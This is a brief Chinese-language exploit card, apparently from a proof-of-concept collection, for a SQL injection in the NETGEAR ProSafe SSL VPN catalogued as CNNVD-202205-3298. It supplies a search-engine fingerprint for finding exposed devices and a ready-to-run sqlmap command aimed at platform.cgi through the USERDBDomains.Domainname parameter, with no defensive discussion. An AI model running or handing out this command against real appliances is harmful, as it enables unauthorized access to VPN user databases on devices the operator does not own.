# NETGEARProSafeSSLVPNSQL注入（CNNVD-202205-3298）

- **系统**：NETGEARProSafeSSLVPNSQL　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name=="NETGEAR ProSAFE"`

**请求体 / payload**
```
\*\*sqlmap \*\*
sqlmap -u "https://xx.xx.xx.xx/scgi-bin/platform.cgi" --form  -p USERDBDomains.Domainname --batch
```

**其他**
- 版本: * NETGEAR ProSafe SSL VPN